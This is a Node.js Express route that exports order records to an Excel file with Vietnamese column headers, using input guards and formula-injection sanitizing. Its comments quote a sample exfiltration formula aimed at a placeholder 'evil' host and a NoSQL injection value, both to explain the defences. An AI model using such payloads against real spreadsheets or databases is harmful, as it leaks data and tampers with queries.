const express = require('express');
const ExcelJS = require('exceljs');
const Order = require('../../models/Order');
const { formatDate, formatCurrency } = require('../../utils/helpers');
const { asEnum, safeSearch, asDate } = require('../../utils/query-guard');
const router = express.Router();

// Sourced from the schema rather than hardcoded so this stays correct if
// Phase 06 changes the enum (e.g. Q3's plan to drop 'pending').
const ORDER_STATUS_VALUES = Order.schema.path('status').enumValues;

/**
 * Helper function to get status text in Vietnamese
 */
function getStatusText(status) {
	const statusMap = {
		'confirmed': 'Đã xác nhận',
		'paid': 'Đã thanh toán',
		'delivered': 'Đã giao hàng',
		'cancelled': 'Đã hủy'
	};
	return statusMap[status] || status;
}

/**
 * Prefix a value that Excel/LibreOffice would interpret as a formula
 * (leading =, +, -, or @) with a single quote so it renders as literal text.
 * `additionalNote` and other free-text order fields are attacker-controlled
 * at order-creation time; without this, opening the export can execute
 * something like =HYPERLINK("http://evil/"&A1,"click").
 */
function sanitizeCell(value) {
	if (typeof value !== 'string') return value;
	return /^[=+\-@]/.test(value) ? `'${value}` : value;
}

/**
 * @route   GET /api/admin/orders/export/excel
 * @desc    Export orders to Excel
 * @access  Private (Admin authentication handled by parent router)
 */
router.get('/excel', async (req, res) => {
	try {
		// Untrusted query input — coerce through query-guard so a crafted
		// value like status={"$ne":null} or an unescaped search regex can't
		// reshape the query.
		const status = asEnum(req.query.status, [...ORDER_STATUS_VALUES, 'all']);
		const search = safeSearch(req.query.search);
		const startDate = asDate(req.query.startDate);
		const endDate = asDate(req.query.endDate);

		// Build query
		let query = {};

		if (status && status !== 'all') {
			query.status = status;
		}

		if (search) {
			query.$or = [
				{ orderCode: search },
				{ studentId: search },
				{ fullName: search },
				{ email: search }
			];
		}

		if (startDate || endDate) {
			query.createdAt = {};
			if (startDate) query.createdAt.$gte = startDate;
			if (endDate) query.createdAt.$lte = endDate;
		}

		// Get orders
		const orders = await Order.find(query).sort({ createdAt: -1 }).lean();

		// Create workbook
		const workbook = new ExcelJS.Workbook();
		const worksheet = workbook.addWorksheet('Đơn hàng');

		// Define columns
		worksheet.columns = [
			{ header: 'Mã đơn hàng', key: 'orderCode', width: 15 },
			{ header: 'Mã số sinh viên', key: 'studentId', width: 20 },
			{ header: 'Họ tên', key: 'fullName', width: 25 },
			{ header: 'Email', key: 'email', width: 30 },
			{ header: 'Số điện thoại', key: 'phoneNumber', width: 15 },
			{ header: 'Tổng tiền', key: 'totalAmount', width: 15 },
			{ header: 'Trạng thái', key: 'status', width: 15 },
			{ header: 'Ngày đặt', key: 'createdAt', width: 20 },
			{ header: 'Ngày cập nhật', key: 'statusUpdatedAt', width: 20 },
			{ header: 'Mã giao dịch', key: 'transactionCode', width: 15 },
			{ header: 'Lý do hủy', key: 'cancelReason', width: 30 },
			{ header: 'Ghi chú', key: 'additionalNote', width: 30 },
			{ header: 'Chi tiết sản phẩm', key: 'itemDetails', width: 50 }
		];

		// Style header row
		worksheet.getRow(1).font = { bold: true };
		worksheet.getRow(1).fill = {
			type: 'pattern',
			pattern: 'solid',
			fgColor: { argb: 'FFE3F2FD' }
		};

		// Add data
		orders.forEach(order => {
			const itemDetails = order.items.map(item =>
				`${item.productName} x${item.quantity} = ${formatCurrency(item.price * item.quantity)}`
			).join('\n');

			worksheet.addRow({
				orderCode: order.orderCode,
				studentId: sanitizeCell(order.studentId || ''),
				fullName: sanitizeCell(order.fullName || ''),
				email: sanitizeCell(order.email || ''),
				phoneNumber: sanitizeCell(order.phoneNumber || ''),
				totalAmount: formatCurrency(order.totalAmount),
				status: getStatusText(order.status),
				createdAt: formatDate(order.createdAt),
				statusUpdatedAt: order.statusUpdatedAt ? formatDate(order.statusUpdatedAt) : '',
				transactionCode: sanitizeCell(order.transactionCode || ''),
				cancelReason: sanitizeCell(order.cancelReason || ''),
				additionalNote: sanitizeCell(order.additionalNote || ''),
				itemDetails: sanitizeCell(itemDetails)
			});
		});

		// Generate buffer
		const buffer = await workbook.xlsx.writeBuffer();

		// Set headers for file download
		const filename = `don-hang-${new Date().toISOString().split('T')[0]}.xlsx`;
		res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
		res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

		res.send(buffer);

	} catch (error) {
		console.error('Error exporting orders:', error);
		res.status(500).json({
			success: false,
			message: 'Lỗi server khi xuất file Excel'
		});
	}
});

module.exports = router;
